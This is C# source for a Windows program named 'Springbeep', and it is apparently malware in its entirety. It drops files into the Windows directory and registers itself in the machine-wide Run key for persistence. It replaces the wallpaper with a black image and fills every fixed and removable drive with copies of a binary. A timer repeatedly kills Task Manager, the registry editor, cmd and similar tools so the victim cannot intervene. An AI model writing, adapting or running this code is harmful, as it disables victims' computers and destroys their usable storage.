using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Springbeep
{
    public partial class Form1 : Form
    {
        string[] Killproes = { "cmd.exe", "taskkill.exe", "ntsd.exe", "regedit.exe", "mmc.exe", "taskmgr.exe" };

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        [DllImport("shell32.dll")]
        public static extern void SHChangeNotify(uint wEventId, uint uFlags, IntPtr dwItem1, IntPtr dwItem2);

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            if (Directory.Exists(Path.GetTempPath() + @"\HighSpeedCopy"))
            {
                try
                {
                    File.Move(Path.GetTempPath() + @"\HighSpeedCopy\winload.bin", Environment.GetFolderPath(Environment.SpecialFolder.Windows) + @"\winload.bin");
                    Directory.Delete(Path.GetTempPath() + @"\HighSpeedCopy", true);
                }
                catch
                {
                    ;
                }
            }
            Thread mainwork = new Thread(Mainwork);
            mainwork.Start();
        }

        private void Mainwork()
        {
            File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + @"\winload.hlp", Properties.Resources.winload);
            File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + @"\sbeicon.ico", Properties.Resources.sbeicon);
            File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + @"\sbpicon.ico", Properties.Resources.sbpicon);
            File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + @"\blackwall.bmp", Properties.Resources.blackwall);
            process1.Start();
            process1.WaitForExit(5 * 1000);
            RegistryKey Key = Registry.LocalMachine;
            RegistryKey Run = Key.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            Run.SetValue("SpringBeep", "\"" + Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\cmdtool.exe\" /Autorun", RegistryValueKind.String);
            Key.Close();
            SystemParametersInfo(20, 1, Environment.GetFolderPath(Environment.SpecialFolder.Windows) + @"\blackwall.bmp", 1);
            SHChangeNotify(0x8000000, 0, IntPtr.Zero, IntPtr.Zero);
            DriveInfo[] drives = DriveInfo.GetDrives();
            foreach (DriveInfo drive in drives)
            {
                if (drive.DriveType == DriveType.Fixed || drive.DriveType == DriveType.Removable)
                {
                    if (Directory.Exists(drive.Name))
                    {
                        int fileno = 1;
                        while (drive.TotalFreeSpace > 512 * 1024 * 1024)
                        {
                            if (!File.Exists(drive.Name + @"Data" + fileno.ToString() + ".bin"))
                                File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + @"\winload.bin", drive.Name + @"Data" + fileno.ToString() + ".bin");
                            fileno++;
                        }
                    }
                }
            }
        }
        private void timer1_Tick(object sender, EventArgs e)
        {
            Process[] process = Process.GetProcesses();
            foreach(Process thispro in process)
            {
                bool kill = false;
                foreach (String thiskill in Killproes)
                {
                    if (thispro.ProcessName.ToUpper() == Path.GetFileNameWithoutExtension(thiskill).ToUpper())
                        kill = true;
                }
                if (kill)
                    thispro.Kill();
            }
        }
    }
}
